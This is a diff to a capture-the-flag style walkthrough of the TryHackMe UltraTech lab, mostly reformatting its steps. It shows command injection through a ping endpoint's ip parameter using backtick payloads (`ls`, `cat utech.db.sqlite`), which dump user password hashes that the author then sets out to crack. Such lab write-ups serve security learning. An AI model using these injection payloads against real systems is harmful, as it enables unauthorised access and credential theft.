@@ -75,13 +75,16 @@ http://10.10.39.165:31331/partners.html
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT9.png?raw=true)<br />
 Not really helpful to us since we still don't have any login information and default credentials didn't work. Let's continue looking at the other directories we got from gobuster. <br />
 
-I came across the directory /js which had an interesting file "api.js"<br />
+I came across an interesting file in one of the directories gobuster picked up<br />
+```shell
+http://10.10.39.165:31331/js/api.js
+```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT11.png?raw=true)<br />
 This file was also in the source of the login page partners.html <br />
 
 ## Looking for vulnerabilities
 
-Let's take a loot at the api.js file
+Let's take a look at the api.js file
 ```Javascript
 (function() {
     console.warn('Debugging ::');
@@ -142,12 +145,14 @@ Very interesting! This looks like the same output from a ping request sent from 
 
 ## Exploiting Command Injection
 What if we changed the request to something else? Let's see what happens when we try to add a list command at the end<br />
-http://10.10.39.165:8081/ping?ip=10.10.39.165;ls<br />
-Hm, nothing happened. Let's try that again<br />
-http://10.10.39.165:8081/ping?ip=10.10.39.165;`ls` <br />
+```shell
+http://10.10.39.165:8081/ping?ip=10.10.39.165;ls
+```
+Hm, nothing happened. Let's try that again with backticks.<br />
+`http://10.10.39.165:8081/ping?ip=10.10.39.165;`ls``
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT13.png?raw=true)<br />
 Success! We were able to list a file "utech.db.sqlite" before we move on, let's have a look at the database file.<br />
-http://10.10.39.165:8081/ping?ip=10.10.39.165;`cat utech.db.sqlite`<br />
+http://10.10.39.165:8081/ping?ip=10.10.39.165;`cat utech.db.sqlite`
 Interesting... We've found 2 users along with their password hashes! r00t and admin<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT15.png?raw=true)<br />
 Let's try to crack the hashes and see what we can do with them! We know the hashes are MD5.<br />
